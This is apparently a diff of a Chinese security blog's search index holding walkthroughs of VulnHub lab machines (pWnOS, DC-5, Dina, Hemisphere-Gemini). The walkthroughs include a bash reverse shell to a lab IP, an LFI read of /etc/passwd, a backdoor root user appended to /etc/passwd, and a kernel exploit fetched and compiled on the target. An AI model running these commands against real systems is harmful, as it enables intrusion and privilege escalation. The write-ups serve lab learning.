src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"></p>
+<p>第二种思路：<br>之前nmap搜集到了smb服务的信息<br>接着信息搜集</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux 192.168.155.163</span><br></pre></td></tr></table></figure>
+<p>扫描后得到了一个名为william的账户<br>smb服务是开放的，我们还可以趁着这个机会去爆破密码<br>（这是第二种思路，放在此处仅仅为了提供一种思路）</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>接下来就要提权了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>/etc/passwd倒是第一次见，看一下权限<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br>所有用户都有读写执行权限，那我们可以生成一个用户密码写入/etc/passwd</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt reigniting 123456</span><br><span class="line"></span><br><span class="line">echo &#x27;reigniting:$1$reigniti$xfzUaIQTdvQl8beISQhxk/:0:0:reigniting:/home/reigniting:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>用户添加成功，接着<code>su reigniting</code><br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>提权成功，获得第二flag<br>至此，渗透结束</p>
+<hr>
+<blockquote>
+<p>落去君休惜，飞来我自知。<br>莺愁蝶倦晚芳时，纵是明春再见隔年期。</p>
 </blockquote>
 <hr>
 ]]></content>
@@ -953,49 +1324,6 @@
       </tags>
   </entry>
   <entry>
-    <title>靶机pWnOS:1.0渗透记录</title>
-    <url>/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<blockquote>
-<p>下载地址：<a href="http://www.vulnhub.com/entry/pwnos-10,33/">http://www.vulnhub.com/entry/pwnos-10,33/</a></p>
-</blockquote>
-<hr>
-<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机pWnOS:1.0×1<br>渗透机2021.2×1   和靶机在同一网段<br>搜索引擎o(<em>￣︶￣</em>)o</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描内网，确定渗透ip。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>确定ip之后开始信息探测。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.55.140</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"></p>
-<span id="more"></span>
-<p>有两个网页，去看一眼。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>一个是博客，一个是后台管理的登录界面。得到提示是webmin。<br>前面的博客主页有漏洞。（LFI本地文件包含漏洞）</p>
-<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit webmin</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>找到了可以利用的漏洞，那就直接用吧。<br>该漏洞未对特定信息进行处理。可以利用这个漏洞通过精心构造的URL读取服务器上任何文件的内容，并且不需要登录。</p>
-<hr>
-<blockquote>
-<p>参考：<a href="https://www.exploit-db.com/exploits/5092">https://www.exploit-db.com/exploits/5092</a></p>
-</blockquote>
-<hr>
-<p>启动msf<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>漏洞利用<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>shadow文件的hash是加密过的，尝试用john破解。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>记得先把rockyou.txt.gz解压。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>输入命令，等一小会。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br>解密成功。<br>【PS：做到这里想到刚才博客那里其实就可以构造url去读取shadow文件，也不用在拐到webmin上了。手工构造poc就行/..%01一点一点加起来~】<br>h4ckm3           (vmware)<br>接下来shh链接。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>进行了简单的信息收集，发现这个靶机的内核有点老。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br>所以想尝试一下从这里入手。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search vmsplice</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>把利用文件移到桌面上。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>这边渗透机开启服务，用于传输文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 2333   #不指定的话默认为8000端口</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>这边靶机下载文件。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>传输好之后编译、运行。（C源码文件一定要放到目标机上编译才能运行）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc 5092.c</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>运行，提权完成。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"><br>顺带提一嘴，这靶机系统挺老的了，估计可以提权多的去了（）<br>欢迎大家尝试不同的姿势~</p>
-<hr>
-<blockquote>
-<p>在海天相接的地方，飞鸟也可以亲吻鱼。</p>
-</blockquote>
-<hr>
-]]></content>
-      <categories>
-        <category>靶机渗透记录</category>
-      </categories>
-      <tags>
-        <tag>靶机渗透记录</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>靶机covfefe: 1渗透记录</title>
     <url>/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<h2 id="好久不写笔记了，随便整个靶机划划水"><a href="#好久不写笔记了，随便整个靶机划划水" class="headerlink" title="好久不写笔记了，随便整个靶机划划水"></a>好久不写笔记了，随便整个靶机划划水</h2><blockquote>
@@ -1033,68 +1361,38 @@
       </tags>
   </entry>
   <entry>
-    <title>靶机DC-5的渗透记录</title>
-    <url>/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>【未完成，以我现在的水平后半部分解决不了，随缘填坑更新】<br>重保期间，在学校当义工。除了盯着屏幕发呆，也没别的事。于是尝试通过靶机渗透学点东西。<br>顺便发现了靶机作者的个人主页。等DC系列结束之后就去尝试一下新系列（挖坑ing）</p>
-<blockquote>
-<p>下载地址：<a href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a></p>
-</blockquote>
-<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>渗透机×1 kali2021<br>靶机DC-5×1  网络连接模式：NAT模式<br>老生常谈——所有引擎</p>
-<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"></p>
-<span id="more"></span>
-<p>扫描内网</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br>通过mac地址确定靶机后上nmap</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.55.139</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>80端口开着，去访问一下</p>
-<h2 id="利用文件包含漏洞打nc反弹shell"><a href="#利用文件包含漏洞打nc反弹shell" class="headerlink" title="利用文件包含漏洞打nc反弹shell"></a>利用文件包含漏洞打nc反弹shell</h2><p><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>在Contact下面发现了提交表格，那么我们的注意力就要放在这里了<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>随便提交了几回发现了一些问题 提交的内容会直接呈现在url里<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>不仅如此 这时间也有些问题<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>查看源码，发现了footer.php 于是去访问了一下<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br>看样子应该是一处漏洞呀在thankuyou.php上也出现了这个问题<br>大概率是存在文件包含漏洞了<br>【这里其实一开始没注意到，后来发现了作者的个人主页，上面给了点小hint】</p>
-<blockquote>
-<p>作者five86的个人主页&gt; <a href="https://www.five86.com/dc-5.html">https://www.five86.com/dc-5.html</a></p>
-</blockquote>
-<p>访问url/thankyou.php?file=/etc/passwd<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br>果然存在！ 至于我怎么知道的嘛……感觉+试出来的 这里其实可以考虑用Burp Suite或者Wfuzz遍历枚举一下<br>但是考虑只是个靶机 就试着摸了几下 一个靶机而已干嘛这么麻烦（）<br>根据之前的经验，我们已经知道这是Nginx服务器。在网站上的每一步操作都将会被写入日志文件log内，因此我们可以在这里尝试拿 shell<br>插一嘴，还可以使用Wappalyzer插件进行信息收集<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>先写进去个phpinfo()看一下<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>看来是可以的，那就直接写入一句话<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>开始打反弹shell 开启端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>转换为交互式shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p>这个命令可以查找需要root权限才可运行的文件<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br>用searchsploit命令搜索screen-4.5.0<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png"><br>【利用不成功，我不会了。网上看了看别人写的发现还需要编译。对于我这个菜鸟来说实属超纲，先放一放吧，以后水平提升在转过头来解决掉。】</p>
-<hr>
-<blockquote>
-<p>鲤鱼不跃，岂可成龙？大鹏驻足，焉能腾空？人生能有几回搏，此时不搏何时搏？</p>
-</blockquote>
-<hr>
-]]></content>
-      <categories>
-        <category>靶机渗透记录</category>
-      </categories>
-      <tags>
-        <tag>靶机渗透记录</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>靶机Dina: 1.0.1渗透记录</title>
-    <url>/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
+    <title>靶机pWnOS:1.0渗透记录</title>
+    <url>/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<blockquote>
-<p>下载地址：<a href="https://www.vulnhub.com/entry/dina-101,200/">https://www.vulnhub.com/entry/dina-101,200/</a></p>
+<p>下载地址：<a href="http://www.vulnhub.com/entry/pwnos-10,33/">http://www.vulnhub.com/entry/pwnos-10,33/</a></p>
 </blockquote>
 <hr>
-<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机Dina: 1.0.1×1  NAT模式<br>渗透机kali 2021.2×1 和靶机在同一网段</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>打开靶机<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>看一下mac地址<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br>扫描内网</p>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机pWnOS:1.0×1<br>渗透机2021.2×1   和靶机在同一网段<br>搜索引擎o(<em>￣︶￣</em>)o</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描内网，确定渗透ip。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>确定ip之后用namp扫描一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.55.142</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"></p>
+<p><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>确定ip之后开始信息探测。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.55.140</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"></p>
 <span id="more"></span>
-<p>老规矩，先去看一下网页<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>没啥东西，扫描一下目录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.55.142/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>扫到了一些目录，挨个访问看一下<br>/secure看到一个压缩包，先下载下来看看<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>/nothing 的网页源码看到了隐藏的信息，应该是一份小的密码字典<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>之前那个压缩包需要密码 密码就在字典里面，解开后是一个mp3，然而打不开。打开010 editor可以发现是个文档，并且记录了后台登录的地址和用户名<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>转到后台登录的界面，是一个CMS<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>密码字典的diana是密码，进去之后开始渗透测试<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"></p>
-<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>一开始想直接msf懒省事，但是我的shell不能用，一直提醒报错就很烦。<br>搜索引擎上找到了跟这个CMS相关的命令执行漏洞，根据说明来尝试一下<br>先创建一个csv文件<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br>写入文档给的一句话，要加上一些信息，不然过不去。<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>打开Burp Suite拦包<br>上传文件<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>在文件头那里改成cat /etc/passwd<br>forward放包后看一下网页<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>可行，那直接把内容改成反弹shell去连接渗透机kali</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo ‘bash -i&gt;&amp;/dev/tcp/192.168.55.128/2333 0&gt;&amp;1’ | bash</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>连接成功</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>直接sudo -l<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>/usr/bin/perl在运行的时候拥有root权限且不需要密码<br>利用perl进行反弹shell<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>获取到了root权限，提权成功<br>读取flag<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"><br>至此，渗透结束。</p>
+<p>有两个网页，去看一眼。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>一个是博客，一个是后台管理的登录界面。得到提示是webmin。<br>前面的博客主页有漏洞。（LFI本地文件包含漏洞）</p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit webmin</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>找到了可以利用的漏洞，那就直接用吧。<br>该漏洞未对特定信息进行处理。可以利用这个漏洞通过精心构造的URL读取服务器上任何文件的内容，并且不需要登录。</p>
 <hr>
 <blockquote>
-<p>在哪里存在,就在哪里绽放。不要因为难过,就忘了散发芳香。</p>
+<p>参考：<a href="https://www.exploit-db.com/exploits/5092">https://www.exploit-db.com/exploits/5092</a></p>
+</blockquote>
+<hr>
+<p>启动msf<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>漏洞利用<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>shadow文件的hash是加密过的，尝试用john破解。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>记得先把rockyou.txt.gz解压。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>输入命令，等一小会。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br>解密成功。<br>【PS：做到这里想到刚才博客那里其实就可以构造url去读取shadow文件，也不用在拐到webmin上了。手工构造poc就行/..%01一点一点加起来~】<br>h4ckm3           (vmware)<br>接下来shh链接。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>进行了简单的信息收集，发现这个靶机的内核有点老。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br>所以想尝试一下从这里入手。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search vmsplice</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>把利用文件移到桌面上。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>这边渗透机开启服务，用于传输文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 2333   #不指定的话默认为8000端口</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>这边靶机下载文件。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>传输好之后编译、运行。（C源码文件一定要放到目标机上编译才能运行）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc 5092.c</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>运行，提权完成。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"><br>顺带提一嘴，这靶机系统挺老的了，估计可以提权多的去了（）<br>欢迎大家尝试不同的姿势~</p>
+<hr>
+<blockquote>
+<p>在海天相接的地方，飞鸟也可以亲吻鱼。</p>
 </blockquote>
 <hr>
 ]]></content>
@@ -1375,304 +1673,6 @@
       </categories>
       <tags>
         <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>强大工具wmic的学习记录</title>
-    <url>/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>Windows 系统自带的 wmic 命令——内网大杀器！</p>
-<p>在用WMIC执行命令过程中，操作系统默认不会将WMIC的操作记录在日志中，因此也是红队必备！</p>
-<p><strong>但要记得</strong></p>
-<p>使用WMIC连接远程主机，需要目标主机开放135和445(135 端⼝是 WMIC 默认的管理端⼝,445是远程连接端口)</p>
-<p>可用<strong>netstat -an</strong>查看开放端口</p>
-<p>由于这几天比较急着学，所以只学暂时会用到的，本篇笔记不包含所有用法！【回头填坑，画大饼中】</p>
-<p>想要把回显的结果保存到文本里就在最后加上 <strong>&gt; D:\1.txt</strong> 即可</p>
-<h5 id="查看主机内的账号"><a href="#查看主机内的账号" class="headerlink" title="查看主机内的账号"></a>查看主机内的账号</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地:</span><br><span class="line">wmic useraccount get name,SID</span><br><span class="line">远程:</span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; useraccount get name,SID</span><br></pre></td></tr></table></figure>
-
